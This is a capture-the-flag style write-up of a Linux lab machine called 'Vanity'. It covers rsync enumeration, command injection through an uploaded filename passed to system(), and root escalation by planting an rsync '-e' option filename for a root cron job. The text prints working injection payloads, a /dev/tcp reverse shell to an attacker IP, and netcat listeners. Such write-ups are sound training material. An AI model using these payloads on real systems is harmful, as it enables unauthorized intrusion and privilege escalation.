## Vanity - Linux

**Difficulty:** Intermediate
**OS:** Linux

## Enumeration

An initial scan reveals three exposed services: SSH, HTTP, and Rsync.

```bash
rustscan -a 192.168.199.234 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp  open  http    Apache httpd 2.4.41
873/tcp open  rsync   (protocol version 31)
```

The web application is titled **Vanity Virus Scanner**, while Rsync exposes two modules:

```bash
nmap -sV --script "rsync-list-modules" -p 873 192.168.199.234
```

```text
source    Web Source
backup    Virus Samples Backup
```

The `source` module allows us to retrieve files from the web root:

```bash
rsync -av --list-only rsync://192.168.199.234/source

drwxr-xr-x          4,096 2022/10/25 11:31:36 .
-rw-r--r--          2,814 2022/10/25 11:31:36 index.html
-rw-r--r--            155 2022/10/25 11:31:36 style.css
drwxr-xr-x          4,096 2022/10/25 11:31:36 uploads
-rw-r--r--            738 2022/10/25 11:31:36 uploads/upload.php
```

Download `upload.php`:

```bash
rsync -av rsync://192.168.199.234:873/source/uploads/upload.php ./upload.php
```

## Command Injection

The upload handler checks the file extension, moves the uploaded file using the supplied filename, and then passes that filename directly to `system()`:

```php
<?php

if($_FILES['file']['error'] > 0) {
    echo 'Error during uploading, try again';
}

$extsNotAllowed = array(
    'php','php7','php6','phar','phtml','phps',
    'pht','phtm','pgif','shtml','htaccess','inc'
);

$extUpload = strtolower(
    substr(strrchr($_FILES['file']['name'], '.'), 1)
);

if (in_array($extUpload, $extsNotAllowed)) {
    echo 'File not allowed';
} else {
    $name = "{$_FILES['file']['name']}";
    $result = move_uploaded_file($_FILES['file']['tmp_name'], $name);

    if($result){
        system("/usr/bin/clamscan $name");
    }
}
?>
```

The filename is inserted directly into the shell command. By injecting a command after the filename, we can execute arbitrary commands as the web server user.

For example:

```http
Content-Disposition: form-data; name="file"; filename="shell.php; id"
```

The response confirms command execution:

```text
----------- SCAN SUMMARY -----------
Known viruses: 8641122
Engine version: 0.103.6
Scanned directories: 0
Scanned files: 0
Infected files: 0
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 13.230 sec
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Initial Access

With command execution confirmed, a reverse shell can be triggered through the same filename injection.

The shell payload can be base64-encoded and executed through the injected command:

```http
Content-Disposition: form-data; name="file"; filename="shell.php; echo <BASE64_PAYLOAD> | base64 -d | bash"
```

A listener is started on the attacking machine:

```bash
rlwrap -cAr nc -nvlp80
```

After triggering the request, we receive a shell as `www-data`.

The local flag is available in `/var/www`:

```bash
www-data@vanity:/var/www$ cat local.txt
95cf633b01f17b2ee08bb5c042685fef
```

## Privilege Escalation

Running LinPEAS reveals a root cron job:

```text
* *         * * *       root    bash /opt/backup.sh
```

Inspecting the script:

```bash
www-data@vanity:/opt$ cat backup.sh

cd /var/www/html/uploads/
rsync --password-file=/root/passwd -a * rsync://vanity/backup/
```

The script executes `rsync` as root and operates on every file in the `uploads` directory.

Because the wildcard is expanded by the shell, filenames beginning with `-` can be interpreted as command-line options by `rsync`. The `-e` option allows specifying the remote shell command.

A suitable malicious filename can therefore inject an `rsync -e` option when the cron job executes.

Create a script containing a reverse shell:

```bash
www-data@vanity:/var/www/html/uploads$ echo "/bin/sh -i >& /dev/tcp/192.168.45.193/873 0>&1" > root.sh
```

Then create the malicious filename:

```bash
www-data@vanity:/var/www/html/uploads$ touch "/var/www/html/uploads/-e bash root.sh"
```

Start a listener:

```bash
rlwrap -cAr nc -nvlp873
```

When the cron job runs, `rsync` processes the crafted filename and executes the supplied shell as root.

## Root

After receiving the root shell, upgrade it to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then retrieve the proof:

```bash
root@vanity:/var/www/html/uploads# cd /root
root@vanity:~# cat proof.txt
```
